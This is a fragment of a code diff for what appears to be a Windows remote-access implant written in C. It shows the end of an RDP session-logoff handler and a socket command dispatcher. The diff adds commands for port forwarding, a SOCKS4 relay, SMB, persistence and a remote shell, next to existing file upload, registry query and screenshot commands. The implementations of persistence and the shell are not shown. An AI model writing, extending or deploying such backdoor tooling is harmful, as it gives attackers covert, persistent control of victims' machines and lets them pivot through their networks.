+            wsprintf(line, "Session %lu logged off.\r\n", id);
+            send_str(s, line);
+        } else {
+            wsprintf(line, "rdp logoff: failed (err %lu) — check session ID and permissions.\r\n",
+                     GetLastError());
+            send_str(s, line);
+        }
+    } else {
+        send_str(s, "rdp: unknown subcommand — type 'rdp' alone for help\r\n");
+    }
+
+    FreeLibrary(hWts);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
  * Session dispatcher
  * ----------------------------------------------------------------------- */
 static void run_session(SOCKET s)
@@ -838,6 +1651,18 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"put"))        rc=cmd_put(s,cmd_arg(cmd,"put"));
         else if(cmd_is(cmd,"regq"))       rc=cmd_regq(s,cmd_arg(cmd,"regq"));
         else if(cmd_is(cmd,"screenshot")) rc=cmd_screenshot(s);
+        else if(cmd_is(cmd,"portfwd"))    rc=cmd_portfwd(s,cmd_arg(cmd,"portfwd"));
+        else if(cmd_is(cmd,"socks4"))     rc=cmd_socks4(s,cmd_arg(cmd,"socks4"));
+        else if(cmd_is(cmd,"relaystop"))  rc=cmd_relay_stop(s,cmd_arg(cmd,"relaystop"));
+        else if(cmd_is(cmd,"smb"))        rc=cmd_smb(s,cmd_arg(cmd,"smb"));
+        else if(cmd_is(cmd,"rdp"))        rc=cmd_rdp(s,cmd_arg(cmd,"rdp"));
+        else if(cmd_is(cmd,"cwd"))        rc=cmd_cwd(s);
+        else if(cmd_is(cmd,"pwd"))        rc=cmd_cwd(s);
+        else if(cmd_is(cmd,"cd"))         rc=cmd_cd(s,cmd_arg(cmd,"cd"));
+        else if(cmd_is(cmd,"cat"))        rc=cmd_cat(s,cmd_arg(cmd,"cat"));
+        else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
+        else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
+        else if(cmd_is(cmd,"shell"))      rc=cmd_shell(s,shell);
         else                              rc=exec_command(s,cmd,shell);
         if(rc<0) return;
     }
